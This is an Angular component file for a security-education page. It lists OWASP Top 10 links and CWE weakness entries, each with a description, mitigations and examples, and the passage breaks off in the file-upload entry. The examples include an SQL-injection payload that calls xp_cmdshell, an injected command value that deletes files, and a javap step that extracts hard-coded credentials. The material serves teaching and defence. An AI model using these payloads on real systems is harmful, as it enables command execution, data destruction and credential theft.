import { Component, OnInit, Inject } from '@angular/core';
import { EmbedVideoService } from 'ngx-embed-video';
import { MatDialog, MatDialogRef, MAT_DIALOG_DATA } from '@angular/material/dialog';
import { DialogComponentComponent } from './dialog-component/dialog-component.component';






@Component({
  selector: 'app-resources',
  templateUrl: './resources.component.html',
  styleUrls: ['./resources.component.css']
})
export class ResourcesComponent implements OnInit {


  status = false;
  iframeList: any = [];
  contents = [{
    isVulnerablePara: `Some of the more common injections are SQL, NoSQL, OS
    command, Object Relational Mapping (ORM), LDAP, and
    Expression Language (EL) or Object Graph Navigation Library
    (OGNL) injection. The concept is identical among all interpreters.
    Source code review is the best method of detecting if
    applications are vulnerable to injections, closely followed by
    thorough automated testing of all parameters, headers, URL,
    cookies, JSON, SOAP, and XML data inputs. Organizations can
    include static source ( SAST ) and dynamic application test
    DAST ) tools into the CI/CD pipeline to identify newly introduced
    injection flaws prior to production deployment.`
  }];

  videoList = ['https://youtu.be/bYuq73KN9E8', 'https://youtu.be/zJegAtJOOc8'];

  linkList = [
    {
      title: 'A1 Injection',
      url: 'https://www.owasp.org/index.php/Top_10-2017_A1-Injection'
    },
    {
      title: 'A2 Broken Authentication',
      url: 'https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication'
    },
    {
      title: 'A3 Sensitive Data Exposure',
      url: 'https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure'
    },
    {
      title: 'A4 XXE',
      url: 'https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)'
    },
    {
      title: 'A5 Broken Access Control',
      url: 'https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control'
    },
    {
      title: 'A6 Security Misconfiguration',
      url: 'https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration'
    },
    {
      title: 'A7 XSS',
      url: 'https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)'
    },
    {
      title: 'A8 Insecure Deserialization',
      url: 'https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization'
    },
    {
      title: 'A9 Using Components with Known Vulnerabilities',
      url: 'https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities'
    },
    {
      title: 'A10 Insufficient Logging & Monitoring',
      url: 'https://www.owasp.org/index.php/Top_10-2017_A10-Insufficient_Logging%26Monitoring'
    }

  ];



  sansData = [{
    title: '[1] CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)',

    subtitle: `The software constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.
`,
    isVulnerablePara: `Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.

    SQL injection has become a common issue with database-driven web sites. The flaw is easily detected, and easily exploited, and as such, any site or software package with even a minimal user base is likely to be subject to an attempted attack of this kind. This flaw depends on the fact that SQL makes no real distinction between the control and data planes.`,
    prevention: `Strategy: Libraries or Frameworks

    Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
    For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.`,

    example: `MS SQL has a built in function that enables shell command execution. An SQL injection in such a context could be disastrous. For example, a query of the form:

    (bad code)

    SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='$user_input' ORDER BY PRICE
    Where $user_input is taken from an untrusted source.

    If the user provides the string:

    (attack code)

    '; exec master..xp_cmdshell 'dir' --
    The query will take the following form:

    (attack code)

    SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=''; exec master..xp_cmdshell 'dir' --' ORDER BY PRICE
    Now, this query can be broken down into:

    a first SQL query: SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='';
    a second SQL query, which executes the dir command in the shell: exec master..xp_cmdshell 'dir'
    an MS SQL comment: --' ORDER BY PRICE
    As can be seen, the malicious input changes the semantics of the query into a query, a shell command execution and a comment.`,
  },
  {
    title: '[2] CWE-78: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)',
    subtitle: `The software constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.
    `,
    isVulnerablePara: `This could allow attackers to execute unexpected, dangerous commands directly on the operating system. This weakness can lead to a vulnerability in environments in which the attacker does not have direct access to the operating system, such as in web applications. Alternately, if the weakness occurs in a privileged program, it could allow the attacker to specify commands that normally would not be accessible, or to call alternate commands with privileges that the attacker does not have. The problem is exacerbated if the compromised process does not follow the principle of least privilege, because the attacker-controlled commands may run with special system privileges that increases the amount of damage.

    There are at least two subtypes of OS command injection:

    The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system("nslookup [HOSTNAME]") to run nslookup and allow the user to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing.
    The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use "exec([COMMAND])" to execute the [COMMAND] that was supplied by the user. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line.
    From a weakness standpoint, these variants represent distinct programmer errors. In the first variant, the programmer clearly intends that input from untrusted parties will be part of the arguments in the command to be executed. In the second variant, the programmer does not intend for the command to be accessible to any untrusted party, but the programmer probably has not accounted for alternate ways in which malicious attackers can provide input.`,
    prevention: `Phases: Architecture and Design; Operation

    Strategy: Sandbox or Jail

    Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.
    OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.
    This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.
    Be careful to avoid CWE-243 and other weaknesses related to jails.
    Effectiveness: Limited

    Note: The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.
    Phase: Architecture and Design

    Strategy: Attack Surface Reduction

    For any data that will be used to generate a command to be executed, keep as much of that data out of external control as possible. For example, in web applications, this may require storing the data locally in the session's state instead of sending it out to the client in a hidden form field.
    Phase: Architecture and Design

    For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.`,

    example: `The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.

    (bad code)
    Example Language: Java
    ...
    String btype = request.getParameter("backuptype");
    String cmd = new String("cmd.exe /K \"
    c:\\util\\rmanDB.bat "
    +btype+
    "&&c:\\utl\\cleanup.bat\"")

    System.Runtime.getRuntime().exec(cmd);
    ...
    The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form "& del c:\\dbms\\*.*", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.`,
  },
  {
    title: '[3] CWE-120: Buffer Copy without Checking Size of Input (Classic Buffer Overflow)',
    subtitle: `The program copies an input buffer to an output buffer without verifying that the size of the input buffer is less than the size of the output buffer, leading to a buffer overflow.
    `,
    isVulnerablePara: `A buffer overflow condition exists when a program attempts to put more data in a buffer than it can hold, or when a program attempts to put data in a memory area outside of the boundaries of a buffer. The simplest type of error, and the most common cause of buffer overflows, is the "classic" case in which the program copies the buffer without restricting how much is copied. Other variants exist, but the existence of a classic overflow strongly suggests that the programmer is not considering even the most basic of security protections.`,
    prevention: `Phase: Requirements

     Strategy: Language Selection

     Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
     For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.
     Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.
     Phase: Architecture and Design

     Strategy: Libraries or Frameworks

     Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
     Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.
     Note: This is not a complete solution, since many buffer overflows are not related to strings.
     Phase: Build and Compilation

     Strategy: Compilation or Build Hardening

     Run or compile the software using features or extensions that automatically provide a protection mechanism that mitigates or eliminates buffer overflows.
     For example, certain compilers and extensions provide automatic buffer overflow detection mechanisms that are built into the compiled code. Examples include the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice.
     Effectiveness: Defense in Depth

     Note: This is not necessarily a complete solution, since these mechanisms can only detect certain types of overflows. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.
     Phase: Implementation

     Consider adhering to the following rules when allocating and managing an application's memory:
     Double check that your buffer is as large as you specify.
     When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.
     Check buffer boundaries if accessing the buffer in a loop and make sure you are not in danger of writing past the allocated space.
     If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.`,
    example: `The following code attempts to create a local copy of a buffer to perform some manipulations to the data.

      (bad code)
      Example Language: C
      void manipulate_string(char* string){
      char buf[24];
      strcpy(buf, string);
      ...
      }
      However, the programmer does not ensure that the size of the data pointed to by string will fit in the local
       buffer and blindly copies the data with the potentially dangerous strcpy() function. This may result in a
       buffer overflow condition if an attacker can influence the contents of the string parameter.`
  },
  {
    title: '[4] CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)',
    subtitle: `The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users. `,
    isVulnerablePara: `Cross-site scripting (XSS) vulnerabilities occur when:

        1. Untrusted data enters a web application, typically from a web request.
        2. The web application dynamically generates a web page that contains this untrusted data.
        3. During page generation, the application does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, etc.
        4. A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data.
        5. Since the script comes from a web page that was sent by the web server, the victim's web browser executes the malicious script in the context of the web server's domain.
        6. This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain.
        There are three main kinds of XSS:

        Type 1: Reflected XSS (or Non-Persistent) - The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.
        Type 2: Stored XSS (or Persistent) - The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.
        Type 0: DOM-Based XSS - In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.
        Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as "drive-by hacking."

        In many cases, the attack can be launched without the victim even being aware of it. Even with careful users, attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode,
         so the request looks less suspicious.`,
    prevention: `Phase: Architecture and Design

        Strategy: Libraries or Frameworks

        Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
        Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.
        Phases: Implementation; Architecture and Design

        Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.
        For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.
        Parts of the same output document may require different encodings, which will vary depending on whether the output is in the:
        HTML body
        Element attributes (such as src="XYZ")
        URIs
        JavaScript sections
        Cascading Style Sheets and style property
        etc. Note that HTML Entity Encoding is only appropriate for the HTML body.
        Consult the XSS Prevention Cheat Sheet [REF-724] for more details on the types of encoding and escaping that are needed.
        Phases: Architecture and Design; Implementation

        Strategy: Attack Surface Reduction

        Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.
        Effectiveness: Limited

        Note: This technique has limited effectiveness, but can be helpful when it is possible to store client state and sensitive information on the server side instead of in cookies, headers, hidden form fields, etc.
        Phase: Architecture and Design

        For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
        Phase: Architecture and Design

        Strategy: Parameterization

        If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.
        Phase: Implementation

        Strategy: Output Encoding

        Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.
        The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.
        Phase: Implementation

        With Struts, write all data from form beans with the bean's filter attribute set to true.`,

    example: `This example also displays a Reflected XSS (Type 1) scenario.

        The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.

        (bad code)
        Example Language: JSP
        <% String eid = request.getParameter("eid"); %>
        ...
        Employee ID: <%= eid %>
        The following ASP.NET code segment reads an employee ID number from an HTTP request and displays it to the user.

        (bad code)
        Example Language: ASP.NET
        <%
        protected System.Web.UI.WebControls.TextBox Login;
        protected System.Web.UI.WebControls.Label EmployeeID;
        ...
        EmployeeID.Text = Login.Text;
        %>

        <p><asp:label id="EmployeeID" runat="server" /></p>
        The code in this example operates correctly if the Employee ID variable contains only standard alphanumeric text. If it has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.`,

  },
  {
    title: '[5] CWE-306: Missing Authentication for Critical Function',
    subtitle: `The software does not perform any authentication for functionality that requires a provable user identity or consumes a significant amount of resources.
        `,
    isVulnerablePara: `In countless action movies, the villain breaks into a high-security building by crawling through heating ducts or pipes, scaling elevator shafts, or hiding under a moving cart. This works because the pathway into the building doesn't
        have all those nosy security guards asking for identification.
        Software may expose certain critical functionality with the assumption
        that nobody would think of trying to do anything but break in through the front door.
        But attackers know how to case a joint and figure out alternate ways of getting into a system.`,
    prevention: `Architecture and Design
        Divide your software into anonymous, normal, privileged, and administrative areas. Identify which of these areas require a proven user identity, and use a centralized authentication capability.
        Identify all potential communication channels, or other means of interaction with the software, to ensure that all channels are appropriately protected. Developers sometimes perform authentication at the primary channel, but open up a secondary channel that is assumed to be private. For example, a login mechanism may be listening on one network port, but after successful authentication, it may open up a second port where it waits for the connection, but avoids authentication because it assumes that only the authenticated party will connect to the port.

        In general, if the software or protocol allows a single session or user state to persist across multiple connections or channels, authentication and appropriate credential management need to be used throughout.

        Architecture and Design
        For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
        Architecture and Design
        Where possible, avoid implementing custom authentication routines and consider using authentication capabilities as provided by the surrounding framework, operating system, or environment. These may make it easier to provide a clear separation between authentication tasks and authorization tasks.
        In environments such as the World Wide Web, the line between authentication and authorization is sometimes blurred. If custom authentication routines are required instead of those provided by the server, then these routines must be applied to every single page, since these pages could be requested directly.

        Architecture and Design
        Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
        For example, consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator.`,

    example: `In the following Java example the method createBankAccount is used to create a BankAccount object for a bank management application.

        (bad code)
        Example Language: Java
        public BankAccount createBankAccount(String accountNumber, String accountType,
        String accountName, String accountSSN, double balance) {
        BankAccount account = new BankAccount();
        account.setAccountNumber(accountNumber);
        account.setAccountType(accountType);
        account.setAccountOwnerName(accountName);
        account.setAccountOwnerSSN(accountSSN);
        account.setBalance(balance);

        return account;
        }
        However, there is no authentication mechanism to ensure that the user creating this bank account object has the authority to create new bank accounts. Some authentication mechanisms should be used to verify that the user has the authority to create bank account objects.

        The following Java code includes a boolean variable and method for authenticating a user. If the user has not been authenticated then the createBankAccount will not create the bank account object.

        (good code)
        Example Language: Java
        private boolean isUserAuthentic = false;

        // authenticate user,

        // if user is authenticated then set variable to true

        // otherwise set variable to false
        public boolean authenticateUser(String username, String password) {
        ...
        }

        public BankAccount createNewBankAccount(String accountNumber, String accountType,
        String accountName, String accountSSN, double balance) {
        BankAccount account = null;

        if (isUserAuthentic) {
        account = new BankAccount();
        account.setAccountNumber(accountNumber);
        account.setAccountType(accountType);
        account.setAccountOwnerName(accountName);
        account.setAccountOwnerSSN(accountSSN);
        account.setBalance(balance);
        }
        return account;
        }`,

  },
  {
    title: '[6] CWE-862: Missing Authorization',
    subtitle: `The software does not perform an authorization check when an actor attempts to access a resource or perform an action.
        `,
    isVulnerablePara: `Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.

        When access control checks are not applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems,
        including information exposures, denial of service, and arbitrary code execution.`,
    prevention: `Phase: Architecture and Design

        Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.
        Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.
        Phase: Architecture and Design

        Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7].
        Phase: Architecture and Design

        Strategy: Libraries or Frameworks

        Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
        For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].
        Phase: Architecture and Design

        For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.
        One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.
        Phases: System Configuration; Installation

        Use the access control capabilities of your operating system and server environment and define your access control lists accordingly.
         Use a "default deny" policy when defining these ACLs.`,

    example: `This function runs an arbitrary SQL query on a given database, returning the result of the query.

        (bad code)
        Example Language: PHP
        function runEmployeeQuery($dbName, $name){
        mysql_select_db($dbName,$globalDbHandle) or die("Could not open Database".$dbName);
        //Use a prepared statement to avoid CWE-89
        $preparedStatement = $globalDbHandle->prepare('SELECT * FROM employees WHERE name = :name');
        $preparedStatement->execute(array(':name' => $name));
        return $preparedStatement->fetchAll();
        }
        /.../

        $employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);
        While this code is careful to avoid SQL Injection, the function does not confirm the user sending the query is authorized to do so.
         An attacker may be able to obtain sensitive employee information from the database.`,

  },
  {
    title: '[7] CWE-798: Use of Hard-coded Credentials',
    subtitle: `The software contains hard-coded credentials,
        such as a password or cryptographic key, which it uses for its own inbound authentication,
         outbound communication to external components, or encryption of internal data.
        `,
    isVulnerablePara: `Hard-coded credentials typically create a significant hole that allows an attacker to bypass the authentication that has been configured by the software administrator. This hole might be difficult for the system administrator to detect. Even if detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations:

        Inbound: the software contains an authentication mechanism that checks the input credentials against a hard-coded set of credentials.
        Outbound: the software connects to another system or component, and it contains hard-coded credentials for connecting to that component.
        In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the software. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the software will have the same password, even across different organizations, this enables massive attacks such as worms to take place.

        The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end software. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat,
         since the extraction of a password from a binary is usually very simple.`,
    prevention: `Phase: Architecture and Design

        For outbound authentication: store passwords, keys, and other credentials outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system. Properly protect the key (CWE-320). If you cannot use encryption to protect the file, then make sure that the permissions are as restrictive as possible [REF-7].
        In Windows environments, the Encrypted File System (EFS) may provide some protection.
        Phase: Architecture and Design

        For inbound authentication: Rather than hard-code a default username and password, key, or other authentication credentials for first time logins, utilize a "first login" mode that requires the user to enter a unique strong password or key.
        Phase: Architecture and Design

        If the software must contain hard-coded credentials or they cannot be removed, perform access control checks and limit which entities can access the feature that requires the hard-coded credentials. For example, a feature might only be enabled through the system console instead of through a network connection.
        Phase: Architecture and Design

        For inbound authentication using passwords: apply strong one-way hashes to passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When handling an incoming password during authentication, take the hash of the password and compare it to the saved hash.
        Use randomly assigned salts for each separate hash that is generated. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method.
        Phase: Architecture and Design

        For front-end to back-end connections: Three solutions are possible, although none are complete.
        The first suggestion involves the use of generated passwords or keys that are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals.
        Next, the passwords or keys should be limited at the back end to only performing actions valid for the front end, as opposed to having full access.
        Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay-style attacks.`,

    example: `The following code uses a hard-coded password to connect to a database:

        (bad code)
        Example Language: Java
        ...
        DriverManager.getConnection(url, "scott", "tiger");
        ...
        This is an example of an external hard-coded password on the client-side of a connection. This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user "scott" with a password of "tiger" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:

        (attack code)

        javap -c ConnMngr.class
        22: ldc #36; //String jdbc:mysql://ixne.com/rxsql
        24: ldc #38; //String scott
        26: ldc #17; //String tiger`,

  },
  {
    title: '[8] CWE-311: Missing Encryption of Sensitive Data',
    subtitle: `The software does not encrypt sensitive or critical information before storage or transmission.
        `,
    isVulnerablePara: `The lack of proper data encryption passes up the guarantees of confidentiality, integrity, and accountability that properly implemented encryption conveys.
        `,
    prevention: `Phase: Requirements

        Clearly specify which data or resources are valuable enough that they should be protected by encryption. Require that any transmission or storage of this data/resource should use well-vetted encryption algorithms.
        Phase: Architecture and Design

        Ensure that encryption is properly integrated into the system design, including but not necessarily limited to:
        Encryption that is needed to store or transmit private data of the users of the system
        Encryption that is needed to protect the system itself from unauthorized disclosure or tampering
        Identify the separate needs and contexts for encryption:
        One-way (i.e., only the user or recipient needs to have the key). This can be achieved using public key cryptography, or other techniques in which the encrypting party (i.e., the software) does not need to have access to a private key.
        Two-way (i.e., the encryption can be automatically performed on behalf of a user, but the key must be available so that the plaintext can be automatically recoverable by that user). This requires storage of the private key in a format that is recoverable only by the user (or perhaps by the operating system) in a way that cannot be recovered by others.
        Using threat modeling or other techniques, assume that data can be compromised through a separate vulnerability or weakness, and determine where encryption will be most effective. Ensure that data that should be private is not being inadvertently exposed using weaknesses such as insecure permissions (CWE-732). [REF-7]
        Phase: Architecture and Design

        Strategy: Libraries or Frameworks

        When there is a need to store or transmit sensitive data, use strong, up-to-date cryptographic algorithms to encrypt that data. Select a well-vetted algorithm that is currently considered to be strong by experts in the field, and use well-tested implementations. As with all cryptographic mechanisms, the source code should be available for analysis.
        For example, US government systems require FIPS 140-2 certification.
        Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. Reverse engineering techniques are mature. If the algorithm can be compromised if attackers find out how it works, then it is especially weak.
        Periodically ensure that the cryptography has not become obsolete. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong. [REF-267]
        Phase: Architecture and Design

        Strategy: Separation of Privilege

        Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.
        Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
        Phases: Implementation; Architecture and Design

        When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.
        Phase: Implementation

        Strategy: Attack Surface Reduction

        Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.
        Effectiveness: Defense in Depth

        Note: This makes it easier to spot places in the code where data is being used that is unencrypted.`,

    example: `This code writes a user's login information to a cookie so the user does not have to login again later.

        (bad code)
        Example Language: PHP
        function persistLogin($username, $password){
        $data = array("username" => $username, "password"=> $password);
        setcookie ("userdata", $data);
        }
        The code stores the user's username and password in plaintext in a cookie on the user's machine. This exposes the user's login information if their computer is compromised by an attacker. Even if the user's machine is not compromised, this weakness combined with cross-site scripting (CWE-79) could allow an attacker to remotely copy the cookie.

        Also note this example code also exhibits Plaintext Storage in a Cookie (CWE-315).`,

  },
  {
    title: '[9] CWE-434: Unrestricted Upload of File with Dangerous Type',
    subtitle: `The software allows the attacker to upload or transfer files of dangerous types that can be automatically processed within the product's environment.
        `,
    isVulnerablePara: `You may think you're allowing uploads of innocent images (rather, images that won't damage your system - the Interweb's not so innocent in some places). But the name of the uploaded file could contain a dangerous extension such as .php instead of .gif, or other information (such as content type) may cause your server to treat the image like a big honkin' program. So, instead of seeing the latest paparazzi shot of your favorite Hollywood celebrity in a compromising position,
        you'll be the one whose server gets compromised.`,
    prevention: `Architecture and Design
        Generate your own filename for an uploaded file instead of the user-supplied filename, so that no external input is used at all.
        Architecture and Design
        When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.
        Architecture and Design
        Consider storing the uploaded files outside of the web document root entirely. Then, use other mechanisms to deliver the files dynamically.
        Implementation
        Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
